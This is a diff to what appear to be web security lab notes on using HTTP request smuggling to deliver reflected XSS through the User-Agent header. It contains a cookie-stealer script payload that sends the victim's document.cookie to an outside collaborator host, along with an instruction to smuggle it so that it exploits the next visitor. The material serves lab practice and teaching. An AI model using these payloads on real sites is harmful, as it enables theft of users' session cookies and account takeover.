@@ -445,9 +445,9 @@ csrf=ValidCSRFCookieValue&postId=8&name=c&email=c%40c.c&website=&comment=c
 
 ### User-Agent Cookie Stealer
 
->Exploiting HTTP request smuggling to deliver reflected XSS using **User-Agent** value in smuggled request.  
+>Identify the UserAgent value is stored in the GET request loading the blog comment form, and stored in **User-Agent** hidden value. Exploiting HTTP request smuggling to deliver reflected XSS using **User-Agent** value that is then placed in a smuggled request.  
 
-<sup>Basic Cross Site Scripting Payload</sup>  
+<sup>Basic Cross Site Scripting Payload escaping out of HTML document.</sup>  
 
 ```JavaScript
  "/><script>alert(1)</script>
@@ -456,7 +456,7 @@ csrf=ValidCSRFCookieValue&postId=8&name=c&email=c%40c.c&website=&comment=c
 <sub>COOKIE STEALER Payload</sub>  
 
 ```JavaScript
-a"/><script>document.location='http://Collaborator.oastify.com/cookiestealer.php?c='+document.cookie;</script>
+a"/><script>document.location='http://Collaborator.com/?cookiestealer='+document.cookie;</script>
 ```  
 
 >Smuggle this XSS request to the back-end server, so that it exploits the next visitor. Place the XSS cookie stealer in **User-Agent** header.  
